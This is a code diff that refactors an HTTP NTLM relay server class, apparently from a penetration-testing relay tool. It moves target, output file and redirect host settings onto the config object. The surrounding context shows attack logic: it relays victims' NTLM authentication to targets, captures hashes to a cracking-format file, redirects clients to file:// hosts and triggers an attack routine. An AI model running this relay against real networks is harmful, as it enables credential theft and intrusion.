@@ -34,13 +34,6 @@ class HTTPRelayServer(Thread):
     class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
         def __init__(self, server_address, RequestHandlerClass, config):
             self.config = config
-            #Copy required settings from the config
-            #This is because old config passed all variables manually 
-            #and the code still depends on that (TODO: Fix this)
-            self.target = self.config.target
-            self.outputFile = self.config.outputFile
-            self.redirecthost = self.config.redirecthost
-
             SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)
 
     class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
@@ -55,8 +48,8 @@ class HTTPRelayServer(Thread):
             self.domainIp = None
             self.authUser = None
             if self.server.config.mode != 'REDIRECT':
-                if self.server.target is not None:
-                    self.target = self.server.target.get_target(client_address[0],self.server.config.randomtargets)
+                if self.server.config.target is not None:
+                    self.target = self.server.config.target.get_target(client_address[0],self.server.config.randomtargets)
                     logging.info("HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,self.target[1]))
                 else:
                     self.target = self.client_address[0]
@@ -98,7 +91,7 @@ class HTTPRelayServer(Thread):
         def do_SMBREDIRECT(self):
             self.send_response(302)
             self.send_header('Content-type', 'text/html')
-            self.send_header('Location','file://%s' % self.server.redirecthost)
+            self.send_header('Location','file://%s' % self.server.config.redirecthost)
             self.send_header('Content-Length','0')
             self.send_header('Connection','close')
             self.end_headers()
@@ -124,7 +117,7 @@ class HTTPRelayServer(Thread):
             if messageType == 1:
                 if not self.do_ntlm_negotiate(token):
                     #Connection failed
-                    self.server.target.log_target(self.client_address[0],self.target)
+                    self.server.config.target.log_target(self.client_address[0],self.target)
                     self.do_REDIRECT()
             elif messageType == 3:
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
@@ -134,7 +127,7 @@ class HTTPRelayServer(Thread):
 
                     #Only skip to next if the login actually failed, not if it was just anonymous login or a system account which we don't want
                     if authenticateMessage['user_name'] != '': # and authenticateMessage['user_name'][-1] != '$':
-                        self.server.target.log_target(self.client_address[0],self.target)
+                        self.server.config.target.log_target(self.client_address[0],self.target)
                         #No anonymous login, go to next host and avoid triggering a popup
                         self.do_REDIRECT()
                     else:
@@ -147,7 +140,7 @@ class HTTPRelayServer(Thread):
                     logging.info(ntlm_hash_data['hash_string'])
                     if self.server.config.outputFile is not None:
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.config.outputFile)
-                    self.server.target.log_target(self.client_address[0],self.target)
+                    self.server.config.target.log_target(self.client_address[0],self.target)
                     self.do_attack()
                     # And answer 404 not found
                     self.send_response(404)
